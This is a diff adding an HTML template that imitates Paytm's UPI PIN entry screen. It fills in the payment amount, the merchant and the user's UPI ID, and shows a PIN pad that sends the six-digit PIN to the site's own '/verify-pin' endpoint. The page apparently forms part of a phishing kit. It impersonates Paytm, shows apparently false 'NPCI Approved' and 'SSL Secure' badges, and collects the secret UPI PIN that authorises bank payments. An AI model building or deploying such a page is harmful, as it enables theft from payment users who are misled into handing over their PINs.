@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>Enter UPI PIN - Paytm</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; background: #f5f5f5; }
+        .header { background: #00b9f5; padding: 12px 16px; padding-top: 55px; color: white; display: flex; align-items: center; gap: 15px; }
+        .back-btn { background: none; border: none; color: white; font-size: 24px; cursor: pointer; }
+        .container { padding: 20px; }
+        .payment-summary { background: white; border-radius: 16px; padding: 20px; margin-bottom: 20px; text-align: center; }
+        .amount { font-size: 42px; font-weight: bold; color: #333; }
+        .to-text { font-size: 13px; color: #666; margin-top: 8px; }
+        .merchant-name { font-weight: 500; color: #333; }
+        .upi-section { background: white; border-radius: 16px; padding: 24px; }
+        .paying-from { text-align: center; margin-bottom: 30px; }
+        .paying-from-label { font-size: 12px; color: #666; margin-bottom: 5px; }
+        .upi-id { font-weight: 600; font-size: 18px; color: #333; }
+        .pin-dots { display: flex; justify-content: center; gap: 20px; margin: 30px 0; }
+        .pin-dot { width: 16px; height: 16px; border-radius: 50%; background: #ddd; transition: all 0.2s; }
+        .pin-dot.filled { background: #00b9f5; transform: scale(1.2); }
+        .pin-pad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 16px; max-width: 300px; margin: 0 auto; }
+        .pin-key { background: #f5f5f5; border: none; padding: 20px; font-size: 26px; font-weight: 600; border-radius: 50px; cursor: pointer; transition: all 0.1s; color: #333; }
+        .pin-key:active { transform: scale(0.95); background: #e8e8e8; }
+        .forgot-pin { text-align: center; margin-top: 25px; }
+        .forgot-pin a { color: #00b9f5; text-decoration: none; font-size: 14px; }
+        .secure-badge { text-align: center; margin-top: 20px; font-size: 11px; color: #999; display: flex; align-items: center; justify-content: center; gap: 8px; }
+        #pinInput { position: absolute; opacity: 0; pointer-events: none; }
+        .loading { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.7); display: none; align-items: center; justify-content: center; z-index: 1000; flex-direction: column; }
+        .spinner { width: 40px; height: 40px; border: 3px solid rgba(255,255,255,0.3); border-top-color: #00b9f5; border-radius: 50%; animation: spin 1s linear infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .loading-text { margin-top: 15px; color: white; font-size: 14px; }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <button class="back-btn" onclick="history.back()">←</button>
+        <span style="font-size: 18px; font-weight: 500;">Secure Payment</span>
+        <span style="margin-left: auto;">🔒</span>
+    </div>
+
+    <div class="container">
+        <div class="payment-summary">
+            <div class="amount">₹{{ amount }}</div>
+            <div class="to-text">to <span class="merchant-name">{{ merchant.name }}</span></div>
+        </div>
+
+        <div class="upi-section">
+            <div class="paying-from">
+                <div class="paying-from-label">Paying from</div>
+                <div class="upi-id">{{ user.upi_id }}</div>
+                <div style="font-size: 11px; color: #999; margin-top: 4px;">{{ user.name }}</div>
+            </div>
+
+            <div class="pin-dots" id="pinDots">
+                <div class="pin-dot"></div><div class="pin-dot"></div>
+                <div class="pin-dot"></div><div class="pin-dot"></div>
+                <div class="pin-dot"></div><div class="pin-dot"></div>
+            </div>
+
+            <input type="password" id="pinInput" maxlength="6" pattern="\d*" inputmode="numeric" autofocus>
+
+            <div class="pin-pad" id="pinPad">
+                <button class="pin-key" data-key="1">1</button>
+                <button class="pin-key" data-key="2">2</button>
+                <button class="pin-key" data-key="3">3</button>
+                <button class="pin-key" data-key="4">4</button>
+                <button class="pin-key" data-key="5">5</button>
+                <button class="pin-key" data-key="6">6</button>
+                <button class="pin-key" data-key="7">7</button>
+                <button class="pin-key" data-key="8">8</button>
+                <button class="pin-key" data-key="9">9</button>
+                <button class="pin-key" data-key="delete">⌫</button>
+                <button class="pin-key" data-key="0">0</button>
+                <button class="pin-key" data-key="clear">✗</button>
+            </div>
+
+            <div class="forgot-pin">
+                <a href="#">Forgot UPI PIN?</a>
+            </div>
+        </div>
+
+        <div class="secure-badge">
+            <span>🔐</span> 256-bit SSL Secure
+            <span>✓</span> NPCI Approved
+        </div>
+    </div>
+
+    <div id="loading" class="loading">
+        <div class="spinner"></div>
+        <div class="loading-text">Processing payment...</div>
+    </div>
+
+    <script>
+        let pin = '';
+        const pinInput = document.getElementById('pinInput');
+        const pinDots = document.getElementById('pinDots').children;
+        
+        function updatePinDisplay() {
+            for(let i = 0; i < pinDots.length; i++) {
+                if(i < pin.length) pinDots[i].classList.add('filled');
+                else pinDots[i].classList.remove('filled');
+            }
+            if(pin.length === 6) verifyPin();
+        }
+        
+        async function verifyPin() {
+            const loading = document.getElementById('loading');
+            loading.style.display = 'flex';
+            
+            try {
+                const response = await fetch('/verify-pin', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ pin: pin })
+                });
+                const data = await response.json();
+                if(data.status === 'success') window.location.href = data.redirect;
+            } catch(error) {
+                alert('Payment failed. Please try again.');
+                pin = '';
+                updatePinDisplay();
+                pinInput.value = '';
+                pinInput.focus();
+                loading.style.display = 'none';
+            }
+        }
+        
+        document.querySelectorAll('.pin-key').forEach(btn => {
+            btn.addEventListener('click', () => {
+                const key = btn.getAttribute('data-key');
+                if(key === 'clear') { pin = ''; pinInput.value = ''; updatePinDisplay(); }
+                else if(key === 'delete') { pin = pin.slice(0, -1); pinInput.value = pin; updatePinDisplay(); }
+                else if(key >= '0' && key <= '9' && pin.length < 6) { pin += key; pinInput.value = pin; updatePinDisplay(); }
+            });
+        });
+        
+        pinInput.focus();
+        pinInput.addEventListener('input', (e) => {
+            const newPin = e.target.value.replace(/\D/g, '');
+            if(newPin.length <= 6) { pin = newPin; updatePinDisplay(); }
+            else { pinInput.value = pin; }
+        });
+    </script>
+</body>
+</html>
